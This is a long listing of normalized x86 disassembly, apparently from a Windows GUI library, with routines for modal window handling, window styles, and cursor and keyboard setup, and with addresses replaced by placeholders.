xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_465588
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46550c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push j_sub_403ae4#3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465581
lea eax [ ebp - 0x4 ]
call sub_404164
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_463d64
sub_4655a4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46586c
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_4477ec
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_467abc
xor edx edx
push ebp
push sub_46584f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_41891c
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_466abc
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_45f974
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_46582d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_4654f4
xor edx edx
push ebp
push sub_46578c
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_465454
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_4688c8
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_44f7b4
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465793
mov eax [ ebp - 0x4 ]
call sub_4654ec
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_465793
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465837
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_466abc
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_466abc
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_418898
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_418a3c
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_45fa28
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_46587c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c4e4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46587c
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44c4a8
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_4658ec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_46587c
pop ecx
mov eax [ esi + 0x34 ]
call sub_45adb4
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_45adc4
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_465970
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44db04
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_403564
sub_465994
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_403564
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_4659c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_44c4e4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_465994
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4659c4
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44c4a8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_465a40
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_465994
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_465994
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_4659c4
pop ecx
test al al
je r-xdata
sub_465a94
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_403564
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_465ac4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_44c4e4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_465a94
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_465ac4
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44c4a8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_465b40
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_465a94
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_465a94
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_465ac4
pop ecx
test al al
je r-xdata
sub_465b94
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_4188a0
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_4553fc
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_465be8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_465b94
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_403564
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_465c64
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_421914
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_465ca0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_449498
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_44a180
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_465ce8
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_44fab8
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_44f7b4
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_44f7b4
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_44f7b4
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_44f7b4
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_44f7b4
push eax
call RedrawWindow
sub_465e3c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_460bec
mov dl 0x5
mov eax ebx
call sub_462960
mov dl 0x1
mov eax ebx
call sub_44e390
mov dl 0x3
mov eax ebx
call sub_462c5c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_465ea4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_465f7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_44e250
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_44e0bc
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_4484a0
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_448f28
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_404254
mov eax [ ebp - 0xc ]
call sub_404424
push eax
mov eax [ ebp - 0xc ]
call sub_404624
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_448f38
mov eax [ ebp - 0xc ]
call sub_404424
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465f82
lea eax [ ebp - 0xc ]
call sub_404164
retn
mov dl 0x1
mov eax esi
call sub_461fe0
mov edx [ ebp - 0xc ]
mov eax esi
call sub_448fe4
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_4047b0
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_465fa8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_44c4e4
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_461704
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_44c4a8
mov edx ebx
pop ecx
mov si 0xffcc
call sub_403564
inc ebp
dec edi
jne r-xdata
sub_465ff4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_44e250
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_466020
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44ea58
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_466048
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_4643b0
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_44f7b4
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_44e250
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_44f7b4
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_44f7b4
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_44e264
or ecx 0xffffffff
mov dl 0x1
call sub_449674
pop esi
pop ebx
retn
sub_4660e0
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44eec8
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_44a180
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_448954
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_403564
sub_466138
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4661fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_448f28
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_404254
mov eax [ ebp - 0x4 ]
call sub_404424
push eax
mov eax [ ebp - 0x4 ]
call sub_404624
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_448f38
mov eax [ ebp - 0x4 ]
call sub_404424
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_448fe4
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466205
lea eax [ ebp - 0x4 ]
call sub_404164
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_461fe0
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_4047b0
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_466224
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44ec48
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44e250
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_44e264
mov dl [ ebx + 0x57 ]
call sub_448ed4
inc edi
dec esi
jne r-xdata
sub_4662c8
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_4662f8
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_466328
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_421184
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_4666cc
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_4666d8
mov eax ebx
call sub_4666e4
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_462b00
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424004
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424004
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424004
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_466b4c
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_466a28
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_466a28
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_466a28
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_466480
push ebx
push esi
push edi
push ebp
call sub_40371c
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_403368
mov eax [ ebp + 0x88 ]
call sub_403368
mov eax [ ebp + 0x84 ]
call sub_403368
mov eax [ ebp + 0x54 ]
call sub_403368
mov eax [ ebp + 0x50 ]
call sub_403368
mov eax [ ebp + 0x4c ]
call sub_403368
mov eax [ ebp + 0x30 ]
call sub_403368
mov eax [ ebp + 0x34 ]
call sub_403368
mov eax [ ebp + 0x7c ]
call sub_403368
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_403368
mov eax ebp
call sub_466740
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_4211d0
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_403704
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_4188a0
call sub_403368
inc edi
dec esi
jne r-xdata
sub_4665f8
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_466644
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418744
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418744
mov eax [ rw-data ]
call sub_469448
sub_46667c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418a3c
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418a3c
mov eax [ rw-data ]
call sub_469448
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_450d6c
sub_4666e4
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_4667e4
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_466740
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_40270c
mov ebx esi
test ebx ebx
jne r-xdata
sub_46679c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
xor eax eax
mov [ esp ] eax
mov eax edi
call sub_4665a4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
call sub_466590
mov [ esp ] eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_466590
cmp ebp [ eax + 0x4 ]
jne r-xdata
sub_4667e4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_4026ec
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_46680c
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4669b7
push [ fs : eax ]
mov [ fs : eax ] esp
